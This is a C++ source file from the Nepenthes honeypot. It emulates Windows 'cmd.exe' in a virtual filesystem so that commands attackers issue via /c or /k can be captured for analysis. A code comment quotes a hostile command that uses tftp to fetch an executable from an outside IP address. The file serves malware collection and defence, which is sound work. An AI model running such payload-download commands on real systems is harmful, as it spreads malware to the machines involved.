/********************************************************************************
 *                              Nepenthes
 *                        - finest collection -
 *
 *
 *
 * Copyright (C) 2005  Paul Baecher & Markus Koetter
 * 
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 * 
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
 * 
 * 
 *             contact nepenthesdev@users.sourceforge.net  
 *
 *******************************************************************************/

/* $Id */
 
#include "VFSCommandCMD.hpp"
#include "VFSNode.hpp"
#include "VFSDir.hpp"
#include "VFSFile.hpp"
#include "Nepenthes.hpp"
#include "LogManager.hpp"
#include "VFS.hpp"
#include "DownloadManager.hpp"
#include "Dialogue.hpp"
#include "Socket.hpp"

using namespace nepenthes;
using namespace std;

VFSCommandCMD::VFSCommandCMD(VFSNode *parent,VFS *vfs)
{
	m_Name =	"cmd.exe";
	m_ParentNode = parent;
	m_Type = VFS_EXE;
	m_VFS = vfs;
}

VFSCommandCMD::~VFSCommandCMD()
{

} 

/*
Startet eine neue Instanz des Windows 2000-Befehlsinterpreters.

CMD [/A | /U] [/Q] [/D] [/E:ON | /E:OFF] [/F:ON | /F:OFF] [/V:ON | /V:OFF]
    [[/S] [/C | /K] Zeichenfolge]

/C      Führt den Befehl in der Zeichenfolge aus und endet dann.
/K      Führt den Befehl in der Zeichenfolge aus und endet dann nicht.
/S      Bestimmt Behandlung von Zeichenfolgen nach /C oder /K (siehe unten).
/Q      Schaltet die Befehlsanzeige aus.
/D      Deaktiviert die Ausführung von AutoRun-Befehlen von der Registrierung.
/A      Ausgabe interner Befehle in eine Pipe oder Datei im ANSI-Format.
/U      Ausgabe interner Befehle in eine Pipe oder Datei im UNICODE-Format.
/T:fg   Legt die Hinter-/Vordergrundfarben fest (siehe auch COLOR /?).
/E:ON   Aktiviert Befehlserweiterungen (siehe unten).
/E:OFF  Deaktiviert Befehlserweiterungen (siehe unten).
/F:ON   Aktiviert die Ergänzung von Datei- und Verzeichnisnamen.
/F:OFF  Deaktiviert die Ergänzung von Datei- und Verzeichnisnamen.
/V:ON   Aktiviert verzögerte Erweiterung von Variablen, c wird dabei als
        Trennzeichen verwendet. Zum Beispiel wird mit /V:ON die Variable
        !var! zur Ausführungszeit erweitert. Im Gegensatz dazu wird bei
        Verwendung der Syntax var die Variable zum Zeitpunkt der Eingabe
        aufgelöst (Diese Werte können z.B. in einer FOR-Schleife
        unterschiedlich sein!).
/V:OFF  Deaktiviert die verzögerte Erweiterung von Variablen.
*/

int VFSCommandCMD::run(vector<string> *paramlist)
{ // "tftp.exe -i 84.60.21.184 get IExplore327.exe"

	vector <string> params = *paramlist;
	vector <string>::iterator it,jt;

	for ( it=params.begin();it!=params.end();it++ )
	{
		logSpam("cmd.exe param %s \n",&*it->c_str());
		if ( strncasecmp(&*it->c_str(),"/c",2) == 0 ||
			 strncasecmp(&*it->c_str(),"/k",2) == 0 )
		{
			string command;
			for ( jt=it+1;jt!=params.end();jt++ )
			{
				command += *jt;
				if ( *it != params.back() )
				{
					command  += " ";
				}
			}
			m_VFS->addStdIn(&command);
			return 0;
		}
	}
	return 0;
}
